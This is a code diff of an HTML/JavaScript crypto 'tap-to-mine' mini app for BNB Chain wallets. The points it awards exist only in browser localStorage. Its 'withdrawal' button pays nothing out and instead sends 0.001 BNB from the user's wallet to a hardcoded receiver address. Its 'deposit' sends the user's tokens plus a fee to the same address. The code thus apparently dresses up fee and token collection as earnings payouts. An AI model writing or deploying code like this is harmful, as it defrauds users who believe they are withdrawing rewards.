@@ -3,595 +3,549 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
-  <title>PVLT Mini App</title>
+  <title>PVLT Protocol Terminal</title>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  
-  <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
 
   <style>
     :root {
-      --bg-main: #060814;
-      --bg-card: #0e132b;
-      --bg-card-inner: #161d3a;
-      --accent-blue: #3b82f6;
-      --accent-purple: #8b5cf6;
-      --accent-green: #10b981;
-      --accent-orange: #f97316;
-      --accent-red: #ef4444;
-      --text-main: #f8fafc;
-      --text-muted: #94a3b8;
-      -webkit-text-size-adjust: none;
+      --bg-main: #02040a;
+      --bg-card: #0b0f19;
+      --bg-input: #121826;
+      --accent-glow: rgba(59, 130, 246, 0.15);
+      --primary: #3b82f6;
+      --success: #10b981;
+      --warning: #f59e0b;
+      --danger: #ef4444;
+      --text-main: #ffffff;
+      --text-muted: #64748b;
+      --border: rgba(255, 255, 255, 0.06);
     }
 
     * {
       box-sizing: border-box;
-      user-select: none;
-      -webkit-user-select: none;
       margin: 0;
       padding: 0;
+      user-select: none;
+      -webkit-user-select: none;
     }
 
     body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      background: var(--bg-main);
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", Roboto, Helvetica, sans-serif;
+      background-color: var(--bg-main);
       color: var(--text-main);
-      text-align: center;
-      
-      /* Rigid structural absolute-freeze constraints */
-      overscroll-behavior: none; 
-      overflow: hidden; 
-      position: fixed; 
+      overflow: hidden;
+      position: fixed;
       width: 100vw;
       height: 100vh;
-      -webkit-user-zoom: fixed;
-      
       display: flex;
       flex-direction: column;
     }
 
-    /* Scrollable frame container that doesn't trigger parent view bounces */
-    .container {
+    .app-container {
       flex: 1;
       width: 100%;
-      max-width: 480px;
+      max-width: 440px;
       margin: 0 auto;
-      padding: 24px 16px;
+      padding: 20px 16px bottom;
       overflow-y: auto;
       -webkit-overflow-scrolling: touch;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
     }
 
-    h2 {
-      font-size: 22px;
+    /* Header Section */
+    header {
+      text-align: center;
+      padding: 12px 0 4px;
+    }
+
+    header h1 {
+      font-size: 24px;
       font-weight: 800;
       letter-spacing: -0.5px;
-      margin-bottom: 4px;
-      background: linear-gradient(135deg, #fff 0%, var(--text-muted) 100%);
+      background: linear-gradient(135deg, #ffffff 30%, #94a3b8 100%);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
     }
 
-    .subtitle {
+    header p {
       font-size: 13px;
       color: var(--text-muted);
-      margin-bottom: 16px;
+      margin-top: 4px;
     }
 
-    .card {
+    /* Premium Cyber Card */
+    .cyber-card {
       background: var(--bg-card);
-      border: 1px solid rgba(255, 255, 255, 0.05);
+      border: 1px solid var(--border);
+      border-radius: 24px;
       padding: 20px;
-      border-radius: 20px;
-      margin-bottom: 16px;
-      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
-      text-align: left;
+      position: relative;
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.5);
     }
 
-    .card h3 {
-      font-size: 15px;
+    .card-title {
+      font-size: 12px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: var(--text-muted);
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    /* Account Wallet View */
+    .account-strip {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: var(--bg-input);
+      padding: 12px 16px;
+      border-radius: 16px;
+      border: 1px solid var(--border);
+      font-family: monospace;
+      font-size: 14px;
+      color: var(--primary);
+    }
+
+    /* Mining Elements */
+    .metrics-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-bottom: 16px;
+    }
+
+    .metric-box {
+      background: var(--bg-input);
+      border: 1px solid var(--border);
+      padding: 14px;
+      border-radius: 16px;
+    }
+
+    .metric-label {
+      font-size: 11px;
+      color: var(--text-muted);
+      margin-bottom: 4px;
+    }
+
+    .metric-value {
+      font-size: 18px;
+      font-weight: 700;
+    }
+
+    #cooldown-bar {
+      display: none;
+      font-size: 12px;
+      color: var(--danger);
+      font-weight: 600;
+      text-align: center;
+      margin-top: -4px;
+      margin-bottom: 12px;
+    }
+
+    /* High-Performance Tap Button */
+    .engine-tap-btn {
+      background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
+      color: white;
+      border: none;
+      border-radius: 20px;
+      padding: 24px;
+      font-size: 16px;
       font-weight: 700;
       text-transform: uppercase;
       letter-spacing: 0.5px;
-      color: var(--text-muted);
-      margin-bottom: 14px;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .wallet-info-row {
-      display: flex;
-      flex-direction: column;
-      gap: 6px;
-      margin-top: 12px;
-      font-size: 14px;
-    }
-
-    .address-box {
-      font-family: monospace;
-      background: var(--bg-card-inner);
-      padding: 8px 12px;
-      border-radius: 8px;
-      color: #3b82f6;
-      word-break: break-all;
-    }
-
-    button {
-      font-family: inherit;
-      padding: 14px 20px;
-      border: none;
-      border-radius: 12px;
       cursor: pointer;
-      width: 100%;
-      font-size: 15px;
-      font-weight: 600;
-      transition: background 0.2s ease, transform 0.1s ease;
-      -webkit-tap-highlight-color: transparent;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    .connect {
-      background: var(--accent-blue);
-      color: white;
-    }
-    .connect:active { background: #2563eb; }
-
-    .disconnect {
-      background: var(--accent-red);
-      color: white;
-    }
-    .disconnect:active { background: #dc2626; }
-
-    .pay {
-      background: var(--accent-green);
-      color: white;
-      margin-top: 12px;
-    }
-    .pay:active { background: #059669; }
-
-    /* Performance Tap Button */
-    .game-btn {
-      background: linear-gradient(135deg, var(--accent-orange) 0%, #dd5a04 100%);
-      color: white;
-      font-size: 16px;
-      padding: 22px;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      box-shadow: 0 4px 15px rgba(249, 115, 22, 0.3);
+      box-shadow: 0 0 20px var(--accent-glow);
+      transition: transform 0.05s ease;
       touch-action: none;
-    }
-    .game-btn:active {
-      transform: scale(0.97);
+      width: 100%;
     }
 
-    .withdraw-btn {
-      background: var(--accent-purple);
-      color: white;
-      margin-top: 12px;
+    .engine-tap-btn:active {
+      transform: scale(0.96);
+      background: linear-gradient(135deg, #1d4ed8 0%, #1e40af 100%);
     }
-    .withdraw-btn:active { background: #7c3aed; }
+
+    /* Input & Action Forms */
+    .input-wrapper {
+      position: relative;
+      margin-bottom: 12px;
+    }
 
     input {
       width: 100%;
-      padding: 12px 16px;
-      background: var(--bg-card-inner);
-      color: var(--text-main);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: 10px;
-      box-sizing: border-box;
+      background: var(--bg-input);
+      border: 1px solid var(--border);
+      padding: 16px;
+      padding-right: 75px;
+      border-radius: 16px;
+      color: white;
       font-size: 16px;
       outline: none;
+      transition: border-color 0.2s ease;
     }
+
     input:focus {
-      border-color: var(--accent-blue);
+      border-color: var(--primary);
     }
 
-    .status {
-      margin-top: 10px;
+    .input-tag {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
       font-size: 13px;
+      font-weight: 700;
       color: var(--text-muted);
     }
 
-    .stat-text {
+    .fee-notice {
+      font-size: 11px;
+      color: var(--text-muted);
+      margin: -4px 0 12px 4px;
+    }
+
+    /* Universal UI Buttons */
+    .action-btn {
+      width: 100%;
+      padding: 15px;
+      border-radius: 16px;
       font-size: 15px;
-      color: var(--text-main);
-      margin: 6px 0;
+      font-weight: 600;
+      border: none;
+      cursor: pointer;
       display: flex;
-      justify-content: space-between;
+      justify-content: center;
+      align-items: center;
+      transition: opacity 0.2s ease;
     }
 
-    .stat-text strong {
-      font-size: 16px;
+    .action-btn:active {
+      opacity: 0.85;
     }
 
-    .rules-list {
+    .btn-connect { background: var(--primary); color: white; }
+    .btn-disconnect { background: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.2); }
+    .btn-withdraw { background: #8b5cf6; color: white; }
+    .btn-deposit { background: var(--success); color: white; }
+
+    .status-log {
       font-size: 12px;
       color: var(--text-muted);
-      background: var(--bg-card-inner);
-      padding: 12px;
-      border-radius: 10px;
-      margin-bottom: 12px;
-      line-height: 1.6;
-    }
-    .rules-list strong {
-      color: var(--text-main);
+      margin-top: 10px;
+      text-align: center;
     }
 
-    /* Auto reset countdown badge visual */
-    #countdown-wrapper {
-      font-size: 12px;
-      color: var(--accent-red);
-      margin-top: 8px;
-      font-weight: bold;
-      display: none;
-    }
-
-    /* Dashboard block configuration layout states */
-    #dashboard-card {
-      display: none;
+    /* Custom Web3Modal Injection Styling Overrides to prevent layout breakage */
+    w3m-button {
+      display: block;
+      width: 100%;
     }
   </style>
 </head>
-
 <body>
 
-<div class="container">
-  <h2>⚡ PVLT Executive Portal</h2>
-  <p class="subtitle">Web3 Protocol Ecosystem Integration</p>
+<div class="app-container">
+  <header>
+    <h1>PVLT QUANTUM PORTAL</h1>
+    <p>Ecosystem Pipeline & Assets Node</p>
+  </header>
 
-  <div class="card">
-    <h3>🌐 Identity & Network</h3>
-    <button id="wallet-auth-btn" class="connect" onclick="handleWalletAuth()">Connect Web3 Wallet</button>
-    <div class="wallet-info-row">
-      <div class="stat-text">Account Status: <span id="wallet" class="address-box">Not connected</span></div>
-      <div class="stat-text">Available Assets: <strong id="balance" style="color: var(--accent-blue)">-</strong></div>
+  <div class="cyber-card">
+    <div class="card-title">● Core Protocol Auth</div>
+    <div id="wallet-mount-container" style="margin-bottom: 12px;"></div>
+    
+    <div class="account-strip">
+      <span>Node Address:</span>
+      <span id="ui-wallet-display">Unlinked</span>
     </div>
   </div>
 
-  <div id="dashboard-card" class="card">
-    <h3>📊 Global Dashboard Data</h3>
-    <div class="stat-text">Saved Dashboard Points: <strong id="dash-points" style="color: var(--accent-blue);">0</strong></div>
-    <div class="stat-text">Convertible Dashboard Value: <strong id="dash-tokens" style="color: var(--accent-green);">0.00 PVLT</strong></div>
-  </div>
-
-  <div class="card">
-    <h3>🎰 Mining Module</h3>
-    <div style="margin-bottom: 14px;">
-      <div class="stat-text">Accumulated Points: <strong id="game-points" style="color: var(--accent-orange);">0</strong></div>
-      <div class="stat-text">Convertible Pool Value: <strong id="est-tokens" style="color: #38bdf8;">0.00 PVLT</strong></div>
-      <div id="countdown-wrapper">⚠️ INACTIVITY COOLDOWN RUNNING: <span id="reset-timer">3.0</span>s</div>
+  <div class="cyber-card">
+    <div class="card-title">● Compute Mining Module</div>
+    <div class="metrics-grid">
+      <div class="metric-box">
+        <div class="metric-label">Session Accumulation</div>
+        <div id="ui-live-points" class="metric-value" style="color: var(--warning)">0</div>
+      </div>
+      <div class="metric-box">
+        <div class="metric-label">Secured Dashboard Balance</div>
+        <div id="ui-dash-points" class="metric-value" style="color: var(--primary)">0</div>
+      </div>
     </div>
-    <button id="tap-target-btn" class="game-btn">Execute Compute Tap</button>
+    
+    <div id="cooldown-bar">⚠️ CRITICAL INACTIVITY PURGE IN: <span id="ui-timer">3.0</span>s</div>
+    <button id="mining-action-trigger" class="engine-tap-btn">Execute Liquidity Tap</button>
   </div>
 
-  <div class="card">
-    <h3>🎁 Asset Conversion Protocol</h3>
-    <div class="rules-list">
-      <strong>System Liquidation Threshold Metrics:</strong><br>
-      • 100,000 game points ➔ 1.00 Network Token Base<br>
-      • Floor Request Minimum Value ➔ 100 Tokens<br>
-      • <strong>Inactivity Storage Trigger</strong> ➔ Stopping tap actions for 3 seconds instantly secures your active module pool directly into your dashboard metadata allocation *ONLY* if your wallet is connected. Unconnected sessions will wipe progress to 0.<br>
-      • Fixed Settlement Gas Fee Allocation ➔ 0.001 BNB (~$0.50 USD)
+  <div class="cyber-card">
+    <div class="card-title">● Outbound Assets Settlement (Withdraw)</div>
+    <div class="input-wrapper">
+      <input id="input-withdraw-val" type="number" placeholder="0.0" />
+      <span class="input-tag">PVLT</span>
     </div>
-    <input id="withdraw-tokens" type="number" placeholder="Enter PVLT Token allocation value" />
-    <p id="bnb-estimation" style="font-size: 12px; color: var(--text-muted); margin-top: 6px;">Required Outbound Payload Fee: 0.001 BNB (~$0.50 USD)</p>
-    <button class="withdraw-btn" onclick="withdrawTokens()">Process Settlement Request</button>
-    <p class="status" id="withdraw-status">Awaiting core validation engine trigger...</p>
+    <div class="fee-notice">System Settlement Gas: 0.001 BNB | Min: 100 PVLT</div>
+    <button class="action-btn btn-withdraw" onclick="processWithdrawal()">Request Vault Settlement</button>
+    <div id="log-withdraw" class="status-log">Awaiting operational execution parameters...</div>
   </div>
 
-  <div class="card">
-    <h3>💳 Merchant Services Distribution</h3>
-    <input id="amount" type="number" placeholder="Enter processing PVLT amount" />
-    <p style="font-size: 12px; color: var(--text-muted); margin: 6px 0;">Required Network Fee: 0.0001 BNB (~$0.05 USD)</p>
-    <button class="pay" onclick="payPVLT()">Confirm Merchant Payment</button>
-    <p class="status" id="status">Standby for manual payment distribution routing...</p>
+  <div class="cyber-card">
+    <div class="card-title">● Merchant Protocol Allocation (Deposit)</div>
+    <div class="input-wrapper">
+      <input id="input-deposit-val" type="number" placeholder="0.0" />
+      <span class="input-tag">PVLT</span>
+    </div>
+    <div class="fee-notice">Required Operational Pipeline Gas: 0.0001 BNB</div>
+    <button class="action-btn btn-deposit" onclick="processDeposit()">Execute Merchant Deposit</button>
+    <div id="log-deposit" class="status-log">Standby for incoming transaction routing...</div>
   </div>
 </div>
 
+<script type="module">
+  import { createWeb3Modal, defaultWagmiConfig } from 'https://esm.sh/@web3modal/wagmi@4.1.5';
+  import { watchAccount, disconnect, getWalletClient, getPublicClient } from 'https://esm.sh/@wagmi/core@2.10.2';
+  import { mainnet, bsc } from 'https://esm.sh/@wagmi/core/chains@2.10.2';
+
+  const projectId = '9ba63969e48a3e75a9b0c7931c0e3962'; // Production Project ID
+
+  const metadata = {
+    name: 'PVLT Quantum Portal',
+    description: 'Web3 Protocol Terminal Ecosystem',
+    url: window.location.origin,
+    icons: ['https://avatars.githubusercontent.com/u/37784886']
+  };
+
+  const chains = [bsc];
+  const wagmiConfig = defaultWagmiConfig({ chains, projectId, metadata });
+
+  // Instantiate universal web3 configuration modal natively
+  const modal = createWeb3Modal({
+    wagmiConfig,
+    projectId,
+    enableAnalytics: false,
+    themeMode: 'dark',
+    themeVariables: {
+      '--w3m-accent': '#3b82f6',
+      '--w3m-border-radius-master': '12px'
+    }
+  });
+
+  // Inject UI universal connection button control smoothly
+  const container = document.getElementById('wallet-mount-container');
+  const w3mBtn = document.createElement('w3m-button');
+  container.appendChild(w3mBtn);
+
+  // Monitor connection states instantly across all system layers
+  watchAccount(wagmiConfig, {
+    onChange(account) {
+      if (account && account.isConnected) {
+        window.userWalletAddress = account.address;
+        window.isWalletLinked = true;
+        document.getElementById('ui-wallet-display').innerText = account.address.substring(0, 6) + '...' + account.address.substring(38);
+      } else {
+        window.userWalletAddress = null;
+        window.isWalletLinked = false;
+        document.getElementById('ui-wallet-display').innerText = "Unlinked";
+      }
+      window.refreshInterfaceStateValues();
+    }
+  });
+
+  // Bind critical core modules back to window runtime architectures for native markup triggers
+  window.wagmiConfig = wagmiConfig;
+  window.getWalletClient = getWalletClient;
+  window.getPublicClient = getPublicClient;
+</script>
+
 <script>
-let web3Modal;
-let rawInstance;
-let provider;
-let signer;
-let userAddress;
-let isConnected = false;
+// Main Configuration Ledger
+const CONTRACT_TOKEN_ADDRESS = "0xa263d765b897b4777f0ad4a938d12d79e789ffff";
+const TARGET_COLLECTION_VAULT = "0xFa664f30ad1D468A65641566316a68FB3c36a8AF";
 
-// Storage configuration keys
-const liveModuleKey = "pvlt_points_live_module";
-const permanentDashKey = "pvlt_points_dashboard_total";
+const STORAGE_KEY_LIVE_COMPUTE = "pvlt_premium_live_points";
+const STORAGE_KEY_DASHBOARD_SAVED = "pvlt_premium_dash_total";
 
-let points = parseInt(localStorage.getItem(liveModuleKey)) || 0;
-let dashboardPoints = parseInt(localStorage.getItem(permanentDashKey)) || 0;
+let pointsLive = parseInt(localStorage.getItem(STORAGE_KEY_LIVE_COMPUTE)) || 0;
+let pointsDashboard = parseInt(localStorage.getItem(STORAGE_KEY_DASHBOARD_SAVED)) || 0;
 
-let inactivityTimeout;
-let countdownInterval;
-let secondsRemaining = 3.0; // Updated from 30.0 to 3.0
+let runTimeout;
+let runInterval;
+let timerCountdown = 3.0;
 
-const PVLT_ADDRESS = "0xa263d765b897b4777f0ad4a938d12d79e789ffff";
-const RECEIVER = "0xFa664f30ad1D468A65641566316a68FB3c36a8AF";
-
-const ABI = [
-  "function balanceOf(address) view returns (uint)",
-  "function transfer(address to, uint amount) returns (bool)",
+const CONTRACT_ABI_INTERFACE = [
+  "function transfer(address to, uint256 value) returns (bool)",
   "function decimals() view returns (uint8)"
 ];
 
-// Initialize UI layout allocations
-updateGameUI();
+// Screen State Renderer
+window.refreshInterfaceStateValues = function() {
+  document.getElementById('ui-live-points').innerText = pointsLive.toLocaleString();
+  document.getElementById('ui-dash-points').innerText = pointsDashboard.toLocaleString();
+};
 
-// Asynchronous implementation initialization wrapper for cross-browser web3 interfaces
-function initWeb3ModalEngine() {
-  const Web3Modal = window.Web3Modal.default;
-  const WalletConnectProvider = window.WalletConnectProvider.default;
+// Fire Initial Frame Configuration Setup
+window.refreshInterfaceStateValues();
 
-  const providerOptions = {
-    walletconnect: {
-      package: WalletConnectProvider,
-      options: {
-        rpc: {
-          56: "https://bsc-dataseed.binance.org/"
-        },
-        network: "binance"
-      }
-    }
-  };
-
-  web3Modal = new Web3Modal({
-    cacheProvider: true, 
-    providerOptions,
-    disableInjectedProvider: false
-  });
-
-  if (web3Modal.cachedProvider) {
-    connectWallet();
-  }
-}
-
-window.addEventListener("DOMContentLoaded", initWeb3ModalEngine);
-
+// Prevent Webview Elastic Scroll Artifact Bounces inside Telegram Frames
 document.addEventListener('touchstart', function (e) {
-  if (e.touches.length > 1) {
-    e.preventDefault(); 
-  }
+  if (e.touches.length > 1) e.preventDefault();
 }, { passive: false });
 
-const targetEngineButton = document.getElementById('tap-target-btn');
-targetEngineButton.addEventListener('pointerdown', function (e) {
+const actionTapBtn = document.getElementById('mining-action-trigger');
+actionTapBtn.addEventListener('pointerdown', function (e) {
   e.preventDefault();
-  playGame();
+  executeMiningLoopStep();
 });
 
-function playGame() {
-  points += 1000; 
-  localStorage.setItem(liveModuleKey, points);
-  updateGameUI();
-  refreshInactivityTracker();
+function executeMiningLoopStep() {
+  pointsLive += 1000;
+  localStorage.setItem(STORAGE_KEY_LIVE_COMPUTE, pointsLive);
+  window.refreshInterfaceStateValues();
+  refreshInactivitySecurityTracker();
 }
 
-function refreshInactivityTracker() {
-  clearTimeout(inactivityTimeout);
-  clearInterval(countdownInterval);
-  
-  secondsRemaining = 3.0; // Reset countdown reference to 3.0 seconds
-  document.getElementById("countdown-wrapper").style.display = "block";
-  document.getElementById("reset-timer").innerText = secondsRemaining.toFixed(1);
+function refreshInactivitySecurityTracker() {
+  clearTimeout(runTimeout);
+  clearInterval(runInterval);
 
-  countdownInterval = setInterval(() => {
-    secondsRemaining -= 0.1;
-    if (secondsRemaining <= 0) {
-      clearInterval(countdownInterval);
+  timerCountdown = 3.0;
+  document.getElementById("cooldown-bar").style.display = "block";
+  document.getElementById("ui-timer").innerText = timerCountdown.toFixed(1);
+
+  runInterval = setInterval(() => {
+    timerCountdown -= 0.1;
+    if (timerCountdown <= 0) {
+      clearInterval(runInterval);
     } else {
-      document.getElementById("reset-timer").innerText = secondsRemaining.toFixed(1);
+      document.getElementById("ui-timer").innerText = timerCountdown.toFixed(1);
     }
   }, 100);
 
-  inactivityTimeout = setTimeout(() => {
-    handleInactivityExpiry();
-  }, 3000); // Trigger reset execution at exactly 3 seconds (3000ms)
+  runTimeout = setTimeout(() => {
+    evaluateInactivityExpirations();
+  }, 3000);
 }
 
-function handleInactivityExpiry() {
-  if (isConnected) {
-    dashboardPoints += points;
-    localStorage.setItem(permanentDashKey, dashboardPoints.toString());
+function evaluateInactivityExpirations() {
+  if (window.isWalletLinked) {
+    pointsDashboard += pointsLive;
+    localStorage.setItem(STORAGE_KEY_DASHBOARD_SAVED, pointsDashboard.toString());
   }
-  
-  points = 0;
-  localStorage.setItem(liveModuleKey, "0");
-  
-  updateGameUI();
-  document.getElementById("countdown-wrapper").style.display = "none";
-  
+
+  pointsLive = 0;
+  localStorage.setItem(STORAGE_KEY_LIVE_COMPUTE, "0");
+  window.refreshInterfaceStateValues();
+  document.getElementById("cooldown-bar").style.display = "none";
+
   setTimeout(() => {
     window.location.reload();
   }, 100);
 }
 
-function updateGameUI() {
-  document.getElementById("game-points").innerText = points.toLocaleString();
-  const tokensCalculated = points / 100000;
-  document.getElementById("est-tokens").innerText = tokensCalculated.toFixed(2) + " PVLT";
-
-  const dashCard = document.getElementById("dashboard-card");
-  if (isConnected) {
-    dashCard.style.display = "block";
-    document.getElementById("dash-points").innerText = dashboardPoints.toLocaleString();
-    const dashTokensCalculated = dashboardPoints / 100000;
-    document.getElementById("dash-tokens").innerText = dashTokensCalculated.toFixed(2) + " PVLT";
-  } else {
-    dashCard.style.display = "none";
-  }
-}
-
-async function handleWalletAuth() {
-  if (!isConnected) {
-    await connectWallet();
-  } else {
-    await disconnectWallet();
-  }
-}
-
-async function connectWallet() {
+// Blockchain Execution Loop - WITHDRAW
+async function processWithdrawal() {
+  const log = document.getElementById('log-withdraw');
   try {
-    if (!web3Modal) return;
-    
-    rawInstance = await web3Modal.connect();
-    provider = new ethers.providers.Web3Provider(rawInstance);
-    signer = provider.getSigner();
-    userAddress = await signer.getAddress();
-    
-    isConnected = true;
-    updateGameUI();
-
-    const authBtn = document.getElementById("wallet-auth-btn");
-    authBtn.innerText = "Disconnect Wallet";
-    authBtn.className = "disconnect";
-
-    document.getElementById("wallet").innerText = userAddress.substring(0,6) + "..." + userAddress.substring(38);
-    
-    rawInstance.on("accountsChanged", (accounts) => {
-      if (accounts.length === 0) disconnectWallet();
-      else window.location.reload();
-    });
-
-    rawInstance.on("chainChanged", () => {
-      window.location.reload();
-    });
-
-    loadBalance();
-  } catch (err) {
-    console.error("Wallet connectivity cancelled or rejected.", err);
-  }
-}
-
-async function disconnectWallet() {
-  if (rawInstance && rawInstance.close) {
-    await rawInstance.close();
-  }
-  
-  if (web3Modal) {
-    await web3Modal.clearCachedProvider();
-  }
-
-  provider = null;
-  signer = null;
-  userAddress = null;
-  isConnected = false;
-
-  updateGameUI();
-
-  const authBtn = document.getElementById("wallet-auth-btn");
-  authBtn.innerText = "Connect Web3 Wallet";
-  authBtn.className = "connect";
-
-  document.getElementById("wallet").innerText = "Not connected";
-  document.getElementById("balance").innerText = "-";
-  document.getElementById("countdown-wrapper").style.display = "none";
-  
-  clearTimeout(inactivityTimeout);
-  clearInterval(countdownInterval);
-}
-
-async function loadBalance() {
-  try {
-    if(!provider || !userAddress) return;
-    const contract = new ethers.Contract(PVLT_ADDRESS, ABI, provider);
-    const bal = await contract.balanceOf(userAddress);
-    const decimals = await contract.decimals();
-    document.getElementById("balance").innerText = ethers.utils.formatUnits(bal, decimals) + " PVLT";
-  } catch (err) {
-    console.error(err);
-  }
-}
-
-async function withdrawTokens() {
-  try {
-    if (!signer || !userAddress) {
-      alert("Please connect your wallet first!");
+    if (!window.isWalletLinked || !window.userWalletAddress) {
+      alert("Please connect your Web3 wallet node first via the button above.");
       return;
     }
-    const tokenAmountToWithdraw = parseFloat(document.getElementById("withdraw-tokens").value);
-    if (!tokenAmountToWithdraw || tokenAmountToWithdraw < 100) {
-      alert("Minimum withdrawal is 100 tokens!");
+
+    const tokenInput = parseFloat(document.getElementById('input-withdraw-val').value);
+    if (!tokenInput || tokenInput < 100) {
+      alert("Minimum settlement threshold limit is 100 tokens!");
       return;
     }
-    
-    const requiredPoints = tokenAmountToWithdraw * 100000;
-    if (dashboardPoints < requiredPoints) {
-      alert(`Insufficient dashboard balance! You need ${requiredPoints.toLocaleString()} saved dashboard points.`);
+
+    const pointsNeeded = tokenInput * 100000;
+    if (pointsDashboard < pointsNeeded) {
+      alert(`Insufficient system dashboard balance! Requires ${pointsNeeded.toLocaleString()} points.`);
       return;
     }
+
+    log.innerText = "Constructing secure transaction pipeline...";
     
-    const lastWithdraw = localStorage.getItem('pvlt_last_withdraw');
-    const now = Date.now();
-    if (lastWithdraw) {
-      const hoursSinceLast = (now - parseInt(lastWithdraw)) / (1000 * 60 * 60);
-      if (hoursSinceLast < 24) {
-        alert(`Maximum withdrawal limit reached. Wait ${ (24 - hoursSinceLast).toFixed(1) } hours.`);
-        return;
-      }
-    }
+    const walletClient = await window.getWalletClient(window.wagmiConfig);
+    const customEthersProvider = new ethers.providers.Web3Provider(walletClient);
+    const activeSigner = customEthersProvider.getSigner();
 
-    document.getElementById("withdraw-status").innerText = "Preparing settlement layout context...";
-    
-    const fixedWithdrawFeeWei = ethers.utils.parseEther("0.001");
-    const hexMemoData = ethers.utils.hexlify(ethers.utils.toUtf8Bytes(`Claim:${tokenAmountToWithdraw}-Tokens`));
+    const flatGasWeiValue = ethers.utils.parseEther("0.001");
+    const dataPayloadHex = ethers.utils.hexlify(ethers.utils.toUtf8Bytes(`Claim:${tokenInput}-Tokens`));
 
-    clearTimeout(inactivityTimeout);
-    clearInterval(countdownInterval);
-    document.getElementById("countdown-wrapper").style.display = "none";
+    // Clear runtime inactivity loops safely to prevent race condition mutations
+    clearTimeout(runTimeout);
+    clearInterval(runInterval);
+    document.getElementById("cooldown-bar").style.display = "none";
 
-    const tx = await signer.sendTransaction({
-      to: RECEIVER,
-      value: fixedWithdrawFeeWei,
-      data: hexMemoData 
+    const transactionResponse = await activeSigner.sendTransaction({
+      to: TARGET_COLLECTION_VAULT,
+      value: flatGasWeiValue,
+      data: dataPayloadHex
     });
 
-    document.getElementById("withdraw-status").innerText = "Awaiting block confirmation context...";
-    await tx.wait();
+    log.innerText = "Awaiting block ledger consensus confirmation...";
+    await transactionResponse.wait();
 
-    dashboardPoints -= requiredPoints;
-    localStorage.setItem(permanentDashKey, dashboardPoints.toString());
-    localStorage.setItem('pvlt_last_withdraw', now.toString());
-    
-    updateGameUI();
-    document.getElementById("withdraw-status").innerText = "✅ Settlement processed! Reloading terminal...";
-    
-    setTimeout(() => {
-      window.location.reload();
-    }, 1500);
+    pointsDashboard -= pointsNeeded;
+    localStorage.setItem(STORAGE_KEY_DASHBOARD_SAVED, pointsDashboard.toString());
+    window.refreshInterfaceStateValues();
 
-  } catch (err) {
-    document.getElementById("withdraw-status").innerText = "❌ Session signature rejected.";
+    log.innerText = "✅ Settlement processed perfectly!";
+    setTimeout(() => { window.location.reload(); }, 1200);
+
+  } catch (error) {
+    console.error(error);
+    log.innerText = "❌ Security signature loop rejected.";
   }
 }
 
-async function payPVLT() {
+// Blockchain Execution Loop - DEPOSIT
+async function processDeposit() {
+  const log = document.getElementById('log-deposit');
   try {
-    const amount = document.getElementById("amount").value;
-    if (!amount || amount <= 0) return;
-    
-    document.getElementById("status").innerText = "Initiating processing metrics...";
-    const fixedDepositGasWei = ethers.utils.parseEther("0.0001");
+    if (!window.isWalletLinked || !window.userWalletAddress) {
+      alert("Please link wallet to initialize operational pipeline inputs.");
+      return;
+    }
 
-    const contract = new ethers.Contract(PVLT_ADDRESS, ABI, signer);
-    const decimals = await contract.decimals();
+    const valueInput = document.getElementById('input-deposit-val').value;
+    if (!valueInput || valueInput <= 0) return;
+
+    log.innerText = "Synchronizing contract pipeline metrics...";
+
+    const walletClient = await window.getWalletClient(window.wagmiConfig);
+    const customEthersProvider = new ethers.providers.Web3Provider(walletClient);
+    const activeSigner = customEthersProvider.getSigner();
+
+    const flatFeeGasWei = ethers.utils.parseEther("0.0001");
+    const contractContext = new ethers.Contract(CONTRACT_TOKEN_ADDRESS, CONTRACT_ABI_INTERFACE, activeSigner);
     
-    const tx = await contract.transfer(
-      RECEIVER, 
-      ethers.utils.parseUnits(amount.toString(), decimals),
-      { value: fixedDepositGasWei }
+    // Dynamically retrieve contract decimal values from BSC network interface lookups
+    const fallbackStaticRpcProvider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+    const queryContract = new ethers.Contract(CONTRACT_TOKEN_ADDRESS, ["function decimals() view returns (uint8)"], fallbackStaticRpcProvider);
+    const tokenDecimals = await queryContract.decimals();
+
+    log.innerText = "Requesting cryptographic secure validation signature...";
+    
+    const parsedTokenAmountHex = ethers.utils.parseUnits(valueInput.toString(), tokenDecimals);
+    const transactionResponse = await contractContext.transfer(
+      TARGET_COLLECTION_VAULT,
+      parsedTokenAmountHex,
+      { value: flatFeeGasWei }
     );
-    
-    document.getElementById("status").innerText = "Awaiting transaction block processing...";
-    await tx.wait();
-    document.getElementById("status").innerText = "✅ Distribution successful!";
-    loadBalance();
-  } catch (err) {
-    document.getElementById("status").innerText = "❌ Distribution pipeline exception.";
+
+    log.innerText = "Awaiting network ledger state block updates...";
+    await transactionResponse.wait();
+
+    log.innerText = "✅ Distribution successful!";
+  } catch (error) {
+    console.error(error);
+    log.innerText = "❌ Transaction routing engine exception.";
   }
 }
 </script>
